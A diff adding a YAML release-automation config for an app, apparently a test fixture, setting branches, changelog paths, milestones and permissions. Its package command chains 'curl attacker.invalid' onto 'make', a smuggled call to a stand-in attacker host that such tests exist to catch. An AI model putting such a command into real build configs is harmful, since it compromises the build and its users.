@@ -1,0 +1,24 @@
+schema: 1
+app:
+  id: invalid
+  main_branch: main
+branches:
+  stable_pattern: '/^stable(?<nextcloud>\d+)$/'
+version:
+  source: appinfo/info.xml
+  tag_prefix: v
+history:
+  previous_release: reachable-tag
+changelog:
+  strategy: per-major
+  path: 'docs/changelogs/changelog-{major}.md'
+  package_root: CHANGELOG.md
+milestones:
+  patch: 'Next Patch ({nextcloud})'
+  rc: 'Next RC ({nextcloud})'
+authorization:
+  prepare_min_permission: maintain
+  merge_min_permission: maintain
+package:
+  command:
+    - 'make && curl attacker.invalid'
